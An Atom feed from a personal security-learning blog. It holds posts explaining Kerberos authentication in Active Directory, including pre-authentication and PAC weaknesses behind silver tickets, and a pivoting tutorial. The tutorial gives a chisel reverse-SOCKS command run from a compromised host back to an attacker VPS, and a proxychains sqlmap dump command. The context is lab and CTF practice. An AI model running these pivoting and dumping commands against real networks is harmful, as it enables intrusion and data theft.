<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-09-15T09:30:02.754Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows域-Kerberos协议</title>
    <link href="https://ke1nys.github.io/posts/1bedf17b.html"/>
    <id>https://ke1nys.github.io/posts/1bedf17b.html</id>
    <published>2023-09-15T07:05:59.000Z</published>
    <updated>2023-09-15T09:30:02.754Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话其实是在thm简单的了解和查看了一遍  然后在打靶机的时候又遇到了 所以就自己写一下  加深印象</p><p><a href="https://jtz.notion.site/Kerberos-60eca8e8fa294275a7ae5cff4b893e90">参考文章</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Kerberos 是一种网络认证协议, 其设计目标是通过密钥系统为 客户机 服务器 应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥) 执行认证服务的</p><p><strong>其实也是两大AD域身份验证协议之一  另一个是NTLM协议  (微软专用)</strong></p><p><strong>这个协议默认是88端口</strong></p><h2 id="参与对象"><a href="#参与对象" class="headerlink" title="参与对象"></a>参与对象</h2><ol><li>KDC : KDC是负责Kerberos协议的主要服务。该服务在域控制器服务器上运行。它包含 Active Directory 环境中所有客户端和服务帐户的信息和密码哈希。这些密码哈希值在 Kerberos 协议期间用作共享密钥<ol><li>Authentication Service (AS) : 它是密钥分发中心中负责认证步骤的模块。该模块通过检查客户端是否在Active Directory域（Domain）、提供的密码是否正确等信息来对客户端进行身份验证</li><li>Ticket Granting Service (TGS): 该模块为经过身份验证的客户端提供必要票证的创建、验证和管理</li><li>KRBTGT : 它是提供密钥分发中心服务管理的用户帐户。该用户的密码哈希用于加密某些票证</li></ol></li><li>客户端 : 发起认证以访问服务的对象, 可以时用户账号也可以是机器账号, 在 AD 中每个用户和计算机都有一个账号, 其中用户账号是使用用户名创建的, 而计算机账号是使用 <code>计算机名+$</code> 表示的, 计算机账号和用户账号一样都有密码这些密码每30天重新生成一次</li><li>服务端 : 客户端想要访问的服务, 管理这些服务的用户、计算机对象也被称为服务账号</li><li>Account Database : 存储所有客户端的白名单 , <strong>只有存在于白名单的客户才能申请 TGT</strong></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>TGT</li></ul><p>TGT的申请条件就是必须是域用户  并且申请的时候密码也必须正确</p><ul><li>TGS</li></ul><p>这个的话是通过TGT身份验证通过后 想要在访问什么服务的时候才会去申请来创建对应的票据</p><h2 id="简单认证流程"><a href="#简单认证流程" class="headerlink" title="简单认证流程"></a>简单认证流程</h2><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F623a54a7-927e-4a9d-b24d-74fbc0166230%2FUntitled.png" alt="img"></p><h3 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h3><p>用户将 用户名&amp;密码派生的密钥加密的时间戳 发送的密钥分发中心 (KDC), 该服务通常安装在负责在网络上创建 Kerberos 票证的域控制器上, 当验证通过后, KDC 将创建发回票证授予票证(TGT) , 这将允许用户请求额外的票证以访问特定的服务, 需要一张票才能获得更多的票可能听起来有点奇怪，但它允许用户在每次想要连接到服务时无需传递其凭据即可请求服务票。与TGT一起的还有一个 TGS_Session_KEY 被提供给用户，我们需要基于此来获取更多的内容</p><p><strong>TGT 是使用 krbtgt 帐户的密码哈希加密的，因此用户无法访问其内容。同时加密的TGT包括 TGS_Session_Key 的副本作为其内容的一部分，并且 KDC 无需存储会话密钥，因为它可以在需要时通过解密 TGT 来恢复副本</strong></p><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe8ea9662-b45d-4e4f-80c3-587e91b3a812%2FUntitled.png" alt="img"></p><ul><li><strong>Session_key是啥</strong></li></ul><p><img src="../images/image-20230915153036447.png" alt="image-20230915153036447"></p><ul><li><strong>TGT中包含了啥</strong></li></ul><p>TGT票据中包含的是与用户相关的身份信息，例如用户名、颁发票据的时间戳、票据的有效期等。此外，<strong>TGT票据还包含了Session Key，该密钥用于后续的票据交换和加密通信。</strong></p><h3 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h3><ul><li><strong>现在用户手里有了 TGT 和 TGS_Session_Key , 现在我们需要去获取服务的票证</strong></li></ul><p>现在用户如果想要连接到网络上的服务（如共享、网站或数据库）时, 他们将使用他们的 TGT 向 KDC 请求票证授予服务(TGS) 。TGS 是只允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送使用 <code>TGS_Session_Key 加密的用户名和时间戳</code> ，以及 <code>TGT</code> 和 <code>服务主体名称 (SPN)</code> ，后者指示我们打算访问的服务和服务器名称。</p><p>因此，KDC 将向我们发送一个 TGS 以及一个 Service_Session_Key，我们需要用它来验证我们想要访问的服务</p><p><strong>(这个TGS的话是使用服务拥有者自己的hash值来进行加密的  TGT的话是使用krbtgt的hash值来进行加密的)</strong></p><p><strong>TGS 使用从服务所有者哈希派生的密钥进行加密 。服务所有者是运行服务的用户或机器帐户。TGS 在其加密内容上包含 Service_Session_Key 的副本，以便服务所有者可以通过解密 TGS 来访问它。</strong></p><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9a72bf42-13db-4c2e-b1b0-e8feb2090908%2FUntitled.png" alt="img"></p><h3 id="AP-REQ-amp-AP-REP"><a href="#AP-REQ-amp-AP-REP" class="headerlink" title="AP_REQ&amp; AP_REP"></a>AP_REQ&amp; AP_REP</h3><p>然后可以将 TGS 发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户密码哈希来解密 TGS 并验证 Service_Session_Key</p><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F147df7fb-a1cf-4c21-b710-c5622587fccc%2FUntitled.png" alt="img"></p><h2 id="详细流程"><a href="#详细流程" class="headerlink" title="详细流程"></a>详细流程</h2><p><strong>(上面讲的只是简单的流程  没有具体分析传了啥  干了啥)</strong></p><p>接下来的话几乎都是照搬了</p><h3 id="AS-REQ-amp-AS-REP-1"><a href="#AS-REQ-amp-AS-REP-1" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h3><h4 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h4><p>这一阶段 <code>Client</code>  向 <code>Authentication Service</code> (身份验证服务器) 发出请求, 发送以下数据:</p><ul><li>域名、用户名</li><li>KRBTGT 的 SPN (这是 KDC 的 SPN )</li><li>使用 Client 加密的时间戳 : 也就是我们的请求凭据 PA-DATA</li></ul><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F47d2d41d-b75f-4fe5-befa-75c3b2332194%2FUntitled.png" alt="img"></p><h4 id="以下是对数据包的分析"><a href="#以下是对数据包的分析" class="headerlink" title="以下是对数据包的分析"></a>以下是对数据包的分析</h4><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2Ff9a30f9e-1fab-4937-a287-ef4c48f9f789%2FUntitled.png" alt="img"></p><p>凡是皆有例外, 对于 AS_REQ 还存在一种特殊的情况就是: 不存在 PA-ENC-TIMESTAMP字段,也就是不再发送使用用户哈希加密的时间戳, 相当于绕过了第一步校验  <strong>(就是不进行预身份验证了  这样子造成的危害就是域控的话就不会对其用户身份进行校验  就直接将TGT和Session key返回回来)</strong></p><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F88a4148a-d876-4cb9-a8b5-94d5cfc57990%2Fas-req-2.png" alt="img"></p><p>这张图片就是显示的是  不进行预身份验证 </p><p>(PAC的话等下在后面会讲到)</p><h4 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h4><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2Fa71d7819-d3ea-481f-9dde-5db864b958f6%2FUntitled.png" alt="img"></p><p>KDC 中的 <code>Authentication Service</code> (身份验证服务器)  接收到 Client 发出的请求后, 到 <code>Kerberos 认证数据库</code> 根据用户查找是否存在对应的用户 <code>(此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性 )</code></p><ul><li><p>不存在用户名, 认证失败, 服务结束</p></li><li><p>存在用户, 返回响应</p><ul><li><p>使用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client 哈希</span><br></pre></td></tr></table></figure><p> 加密一段内容进行返回 (注意这是 Client 密钥意味这 Client 端可以解密)</p><ul><li>TGS_Session_key</li><li>时间戳</li><li>TGT 的存活时间</li></ul></li><li><p>TGT (票据授予票据) : 客户端需要使用TGT去KDC中的 TGS（票据授予中心）获取访问网络服务所需的 Ticket（服务授予票据），TGT中包含的内容有 <code>User Name/ID</code>、<code>TGS Name/ID</code>、<code>IP</code>、当前时间戳、TGT 的有效时间、<code>TGS_Session_key</code>。整个TGT<code>使用 krbtgt Hash 加密</code>，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况</p></li></ul></li></ul><p>在这一阶段 AS 获取到用户名之后, 会根据对应的 用户<code>NTLM</code> 值来解密数据信息, 并且验证时间戳，之后生成随机字符串<code>TGS_Session_key</code>，使用用户的 NTLM 哈希值加密 <code>TGS_Session_key</code>，使用<code>krbtgt</code>用户的 NTLM 哈希加密<code>TGS_Session_key</code>和客户端信息 (TGT)，一起返回客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Send=user_NTML_Hash(Session Key)+krbtgt_NTML_Hash(Session Key+client_info1)[TGT]</span><br></pre></td></tr></table></figure><p><strong>现在我们自然要开始分析数据包: (这一步会发送账号所以自然会出现三种情况), 这三种情况返回的包不同, 所以我们可以基于此来进行编写工具</strong></p><ul><li><strong>用户名和密码正确</strong></li><li><strong>用户名不正确</strong></li><li><strong>用户名正确, 密码不正确</strong></li></ul><blockquote><p>密码什么时候传的?</p><p>在我们的第一阶段 AS_REQ 的时候数据包中存在一个 <code>pmdata</code> 我们将使用用户哈希加密的时间戳放在了其中  ———时间戳（使用从其密码派生的密钥加密）</p></blockquote><ol><li><strong>用户名密码正确</strong></li></ol><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F3ea3e6fb-2959-48df-a2ab-f432a064ed88%2FUntitled.png" alt="img"></p><ol><li><strong>用户名不正确 (第一个包)</strong></li></ol><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F670a5e11-dc65-4f66-85a4-5844ae4d44ee%2FUntitled.png" alt="img"></p><ol><li><strong>用户名正确 密码不正确 （就是时间戳不对）</strong></li></ol><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbbc1056e-28b0-4094-bc6e-334aec777b74%2FUntitled.png" alt="img"></p><h3 id="TGS-REQ-amp-TGS-REP-1"><a href="#TGS-REQ-amp-TGS-REP-1" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h3><h4 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h4><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3135bb9f-5c53-4f6f-9379-5e1139deb9ee%2FUntitled.png" alt="img"></p><p>当我们的 Client 端收到 AS 发来的数据后, 会使用我们的客户端的 Hash 来解密一部分数据从而获得 TGS_Session_Key 然后开始发送, 发送内容如下</p><ul><li>AS_REP 阶段返回的 TGT 原样发送</li><li>服务主体名称: 指示我们要访问的那个服务或者服务器</li><li>使用 <code>TGS_Session_Key</code> 加密 <code>User Name</code> 和 <code>时间戳</code></li></ul><p>​    <img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F24f1066c-ce16-44ef-a1e8-87ba331e2c68%2FUntitled.png" alt="img"></p><h4 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h4><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F117ec917-2b82-4290-b43c-6eb3d1fff5db%2FUntitled.png" alt="img"></p><p>TGS 收到用户发出的请求后, 开始了一系列操作</p><ol><li>先去检查是否存在对应的服务</li><li>KDC 对 TGT 内容进行解密<ol><li>使用 TGT 中 <code>TGS_Session_Key</code> 使用此来 TGS_REQ 阶段 Client 加密的数据</li><li>TGT 中包含 Client 端的 <code>User Name</code>和我们发送的内容进行比较</li></ol></li></ol><p><strong>一旦上述验证通过就可以进入下一步</strong></p><ol><li><p>将当前用户信息存储在 <code>TGS Cache</code> 中</p></li><li><p>TGS_Session_Key加密的内容:</p><ol><li>Service Session Key</li><li>TGS 有效时间</li><li>User nonce : 防止重放攻击</li></ol></li><li><p>TGS : 使用</p><p>对应服务的密码加密</p><p>的内容:</p><ol><li>Service Session Key</li><li>UserName/ID</li><li>TGS 有效时间</li><li>PAC</li></ol></li></ol><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2Fc96afa94-3605-42ea-8a43-b693a0ddc439%2FUntitled.png" alt="img"></p><h3 id="AP-REQ-amp-AP-REP-1"><a href="#AP-REQ-amp-AP-REP-1" class="headerlink" title="AP_REQ&amp; AP_REP"></a>AP_REQ&amp; AP_REP</h3><h4 id="AP-REQ"><a href="#AP-REQ" class="headerlink" title="AP_REQ"></a>AP_REQ</h4><p><img src="../images/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F85ecf94f-8aca-422c-92ee-a099f2d34c17%2FUntitled.png" alt="img"></p><p>客户端收到 TGS 后, 会使用在 AS_REP  阶段获取的 <code>TGS_Session_Key</code> 来解密数据从中获取到 <code>Service Session Key</code>, 然后向服务端发送数据包. 内容为:</p><ol><li>从 TGS_REP 阶段获取的  TGS 原样发送</li><li>使用Service Session Key加密的内容<ol><li>User Name/ID</li><li>时间戳</li></ol></li></ol><h4 id="AP-REP"><a href="#AP-REP" class="headerlink" title="AP_REP"></a>AP_REP</h4><p>服务端接收到用户请求后就可以开始一些操作</p><ol><li>使用服务端 Hash 解密 TGS<ol><li>验证时间戳</li><li>获取 <code>Service Session Key</code></li></ol></li><li>使用 <code>Service Session Key</code> 来解密用户传输的 <code>Autherticator</code>, 并验证其中的 <code>User Name/ID</code> 和 <code>时间戳</code></li></ol><p><strong>验证完毕后, 服务器将会返回响应:</strong></p><ul><li>将 Client 信息保存在 <code>Service Cash</code> 中</li><li>使用 <code>Service Session Key</code>加密的内容: <code>Service Name/ID``时间戳</code></li></ul><h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><p>Client 接收到服务方传来的响应, 使用在 TGS_REP 阶段获取的 Service Session Key解密, 验证是否是我们请求的服务, 验证成功后将  Servre Ticket保存到 User Cash 中</p><h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><p>PAC 是 kerberos服务票证的扩展，其中包含各种授权信息、附加凭据信息、配置文件和策略，例如用户所属的用户组、用户所具有的权限，由于在域中不同权限的用户能够访问的资源是不同的，因此微软设计PAC用来辨别用户身份和权限，当用户在Active Directory(AD)域中进行身份验证时，域控制器会将 PAC 信息添加到kerberos票证(TGT 中) , 经过一系列请求后用户访问服务, 此时服务验证 TGS 后, 如果无误就会拿着 PAC 去 KDC 那边验证用户是否有访问服务的权限</p><p><strong>这里存在一个漏洞:</strong></p><ul><li>如果不验证 PAC, 那么我们就可以制作 TGS 来访问所有服务, 这也是白银票据成功的前提</li></ul><h3 id="简略介绍"><a href="#简略介绍" class="headerlink" title="简略介绍"></a>简略介绍</h3><p>KDC 在 AS_REP 的 TGT 中增加了 Client 的 PAC , 其简单结构我们可以从下面这张图中看出, 从中我们可以看到在 PAC 的尾部其实是有两个签名的:</p><ul><li>Server Signature :</li><li>KDC Signature :</li></ul><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F501249fb-9163-4d9b-9ed4-0ece5ef64d15%2F20201221004516-bced232a-42e2-1.png" alt="img"></p><p>现在我们在 AS_REP  阶段获取了 PAC,  为了可以将 PAC 发送到 Server 端, 微软选择了如下做法: </p><ul><li>在 TGS_REQ  阶段, 携带 PAC 的 TGT 被 TGS 服务接收后, 验证完 TGT 后就会将 PAC 解密出来, 并验证两个签名的有效性, 如果无误就认为 PAC 没有被篡改于是更换签名<ul><li>Server Signature : 使用 Server B 的密码哈希生成签名</li><li>KDC Signature : 使用 Service Session Key加密</li></ul></li><li>将重新生成的 PAC 拷贝在 TGS 中并加密起来</li></ul><p><img src="../images/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F97d7a791-a140-486f-99e2-28564136ea73%2F231e26d0-e5df-4b85-8924-aa0801fbcb0b%2F20201221004525-c25445a0-42e2-1.png" alt="img"></p><h3 id="PAC签名"><a href="#PAC签名" class="headerlink" title="PAC签名"></a>PAC签名</h3><blockquote><p>PAC中包含两个数字签名：PAC_SERVER_CHECKSUM和 PAC_PRIVSVR_CHECKSUM</p></blockquote><p>PAC_SERVER_CHECKSUM 是用<strong>服务密钥</strong>进行签名，而 PAC_PRIVSVR_CHECKSUM 使用<strong>KDC密钥</strong>进行签名，签名的原因有两个：</p><ol><li>存在带有服务密匙的签名，以验证此 PAC服务 已由服务签名。</li><li>带有KDC密匙的签名是为了防止不受信任的服务用无效的PAC为自己伪造票据。</li></ol><p>两个签名的类型分别为 PAC_SERVER_CHECKSUM 和 PAC_PRIVSVR_CHECKSUM 类型的</p><p>PAC_INFO_BUFFFER发送。在PAC数据用于访问控制之前，必须检验带有PAC_SERVER_CHECKSUM 的签名，因为这将验证客户端是否知道服务的密匙。而PAC_PRIVSVR_CHECKSUM 签名是可选的，<strong>默认不开启</strong>。它将验证PAC是否由KDC签发，而不是由KDC以外的<strong>具有访问服务密匙</strong>的第三方放入票据中。</p><h3 id="KDC-验证-PAC"><a href="#KDC-验证-PAC" class="headerlink" title="KDC 验证 PAC"></a>KDC 验证 PAC</h3><p>当服务端接收到 AP_REQ消息时，只能校验PAC_SERVER_CHECKSUM签名，并不能校验PAC_PRIVSVR_CHECKSUM 签名。</p><p>因为，如果要检验 <code>PAC_PRIVSVR_CHECKSUM</code> 签名，服务端还需要将客户端发来的ST签名中的PAC签名发回KDC进行校验。但是大部分服务默认没有开启KDC验证PAC这一步（需要目标服务主机配置为验证KDC PAC签名，默认未开启），因此服务端就无须将ST中的PAC签名发送到KDC校验了。</p><p>这也是<strong>白银票据攻击成功的前提</strong>，因为如果目标服务主机为需要校验<code>PAC_PRIVSVR_CHECKSUM</code> 签名，服务器会将这个PAC的数字签名的结果以KRB_VERIFY_PAC的消息通过RPC协议发送给KDC，KDC再将验证后这个PAC的结果以RPC返回码的形式发送回服务端，服务端根据返回的结果判断PAC的真实性与有效性。这样就算攻击者拥有服务密匙，制作ST票据，也无法伪造PAC_PRIVSVR_CHECKSUM签名，自然无法通过KDC签名校验了。</p><blockquote><p>注意：在本地系统账户下的服务，无论如果配置都不会触发KDC签名验证，也就是说SMB、CIFS、HOST等服务，无论如何都不会触发KDC验证PAC签名。</p></blockquote><h3 id="为什么KDC默认不验证PAC签名？"><a href="#为什么KDC默认不验证PAC签名？" class="headerlink" title="为什么KDC默认不验证PAC签名？"></a>为什么KDC默认不验证PAC签名？</h3><p>如果执行KDC验证PAC，意味着有响应时间和带宽使用方面的成本。它需要占用带宽在应用服务器和KDC之间传输请求和响应，这可能导致大容量应用程序服务器中出现了一些性能问题。这样的环境中可能导致额外的网络延迟和大量流量。</p><p>PAC是微软的一个特性，所以启用了PAC的域中不支持其他操作系统的的服务器，制约了域配置的灵活性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话其实是在thm简单的了解和查看了一遍  然后在打靶机的时候又遇到了 所以就自己写一下  加深印象&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://jtz.notion.site/Kerberos-60eca8e8fa294275a7ae5cff4b893e90&quot;&gt;参</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>AD域-预身份验证</title>
    <link href="https://ke1nys.github.io/posts/9fa2b7fe.html"/>
    <id>https://ke1nys.github.io/posts/9fa2b7fe.html</id>
    <published>2023-09-14T07:07:51.000Z</published>
    <updated>2023-09-14T07:20:32.688Z</updated>
    
    <content type="html"><![CDATA[<p>写这个知识点是因为在这个打春秋云镜的时候遇到的  所以写一下来加深印象</p><h2 id="预身份验证"><a href="#预身份验证" class="headerlink" title="预身份验证"></a>预身份验证</h2><p>在用户进行主机登录时  就会用到这个两大协议之一的<code>Kerberos</code>协议</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这个知识点是因为在这个打春秋云镜的时候遇到的  所以写一下来加深印象&lt;/p&gt;
&lt;h2 id=&quot;预身份验证&quot;&gt;&lt;a href=&quot;#预身份验证&quot; class=&quot;headerlink&quot; title=&quot;预身份验证&quot;&gt;&lt;/a&gt;预身份验证&lt;/h2&gt;&lt;p&gt;在用户进行主机登录时  就会用</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>端口转发和流量代理</title>
    <link href="https://ke1nys.github.io/posts/a5488d48.html"/>
    <id>https://ke1nys.github.io/posts/a5488d48.html</id>
    <published>2023-09-14T06:48:03.000Z</published>
    <updated>2023-09-14T06:50:04.843Z</updated>
    
    <content type="html"><![CDATA[<p>这里流量代理使用工具的话是参考这个师傅的</p><p><a href="https://fushuling.com/index.php/2023/08/26/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/">fushuling</a></p><h3 id="端口转发和流量代理"><a href="#端口转发和流量代理" class="headerlink" title="端口转发和流量代理"></a>端口转发和流量代理</h3><p>虽然这里我在thm学了 但是我感觉实践起来还是有点差别的 </p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>端口转发通常是针对特定的端口进行配置和转发。您可以选择性地将特定端口的流量转发到目标主机的对应端口。例如，您可以将本地主机的端口80转发到远程主机的端口80，实现对远程主机上的Web服务的访问。但是端口转发并不限制只能转发一个端口，您可以根据需求进行多个端口的转发配置。</p><p><img src="../images/9fb527b63773be22aa214ea2d06d1351.png" alt="img"></p><p>看这个的话 因为我们的攻击机的话是不能直接访问这个 服务器开放的端口的  我们就只能使能访问该端口的内网主机  来将端口转发出来给我们  这样的话我们的攻击机就能访问到该开放的端口</p><p><strong>(记得在自己的攻击机上将端口开放出来  用于连接转发出来的端口)</strong></p><h4 id="流量代理"><a href="#流量代理" class="headerlink" title="流量代理"></a>流量代理</h4><p>这个知识点的话就和我们使用的vpn来翻墙是一个道理的</p><p>代理可以处理多个端口的流量，并根据配置进行灵活的转发和处理。代理服务器可以接收来自客户端的请求，并将其转发到目标服务器，然后将响应返回给客户端。代理可以是基于特定协议（如HTTP代理、SOCKS代理）或应用层代理（如反向代理）。代理可以将不同端口的流量转发到不同的目标服务器上，根据具体的配置进行灵活的转发。</p><p><img src="../images/1-10.png" alt="img"></p><p>在我们拿下服务器后 因为在内网  有些服务是只能内网机器访问  我们是访问不到的  所以我们就想办法建立代理</p><p>代理的话就是让可控linux服务器作为<strong>代理服务器</strong>  然后让攻击机作为<strong>目标服务器</strong>   当我们使用攻击机来访问这个内网web服务的话  可控的这个linux服务器就会把流量转发到我们的目标服务器 使我们能过访问这个内网web服务</p><p>(其实就和我们的梯子是一个道理  如果我们直接访问<code>youtube</code>的是访问不成功的  如果我们开启vpn的话  就相当于让我们的windows主机作为目标服务器  当我们访问youtube的时候  流量就会通过这个vpn的服务器转发到我们的本机 然后我们就能访问这个youtube了)</p><h5 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h5><p><strong>这里我们进行流量代理的话使用的是 <a href="https://github.com/jpillora/chisel">chisel</a>这个工具</strong>  (重要的是使用的端口必须全部开放)</p><ul><li>在我们主机的vps上运行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 1234 --reverse</span><br></pre></td></tr></table></figure><ul><li>在这台已经getshell的机器上运行：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client vpsip:1234 R:0.0.0.0:7777:socks</span><br></pre></td></tr></table></figure><ul><li>然后连接这个vps:7777的socks5代理</li></ul><p><img src="../images/image-20230914143817356.png" alt="image-20230914143817356"></p><ul><li>最后即可在本地访问内网资源</li></ul><h5 id="代理抓包"><a href="#代理抓包" class="headerlink" title="代理抓包"></a>代理抓包</h5><p>进行socks5代理后还是可以进行抓包  就是套娃  让bp来进行socks5代理</p><p>然后抓8080端口</p><ul><li>使用bp进行socks5代理</li></ul><p><img src="../images/image-20230914144146146.png" alt="image-20230914144146146"></p><ul><li>然后正常抓包抓取8080端口就行了</li></ul><p><img src="../images/image-20230914144216831.png" alt="image-20230914144216831"></p><p>这样的话就可以了</p><p>那么如果我们想要使用别的命令行工具怎么办 没关系  这次的话会用到proxychains4这个工具</p><h5 id="proxychains4s使用"><a href="#proxychains4s使用" class="headerlink" title="proxychains4s使用"></a>proxychains4s使用</h5><ul><li>先进行配置文件的修改</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230914144555515.png" alt="image-20230914144555515"></p><p>将配置文件末尾处的socks代理修改成自己的</p><ul><li>然后就可以进行使用了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sqlmap -r time.txt --dump</span><br></pre></td></tr></table></figure><p>这里演示的话是使用sqlmap工具 其他工具的话也是如此  看自己的需求</p><p><strong>这里的话MSF的也是可以使用进行流量代理的</strong>   下次再试试</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里流量代理使用工具的话是参考这个师傅的&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/26/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/&quot;&gt;</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Time</title>
    <link href="https://ke1nys.github.io/posts/c141a014.html"/>
    <id>https://ke1nys.github.io/posts/c141a014.html</id>
    <published>2023-09-14T06:06:57.000Z</published>
    <updated>2023-09-14T07:07:10.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="#"></a>#</h2><p>第一次打这个  好多都不会 md  <strong>(thm学了但是理论和实践还是有差别的)</strong></p><p><a href="https://fushuling.com/index.php/2023/08/31/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7time/">fushuling——-wp1 </a>    <a href="https://exp10it.cn/2023/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/#flag03--flag04">X1r0z——wp2</a></p><p><strong>这个靶机重点在域渗透  拿下服务器的话是不难的</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;#&quot;&gt;&lt;/a&gt;#&lt;/h2&gt;&lt;p&gt;第一次打这个  好多都不会 md  &lt;strong&gt;(thm学了但是理论和实践还是有差别的)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http</summary>
      
    
    
    
    
    <category term="春秋云镜" scheme="https://ke1nys.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>thm-利用AD域</title>
    <link href="https://ke1nys.github.io/posts/eff966aa.html"/>
    <id>https://ke1nys.github.io/posts/eff966aa.html</id>
    <published>2023-09-09T12:16:24.000Z</published>
    <updated>2023-09-13T03:17:21.088Z</updated>
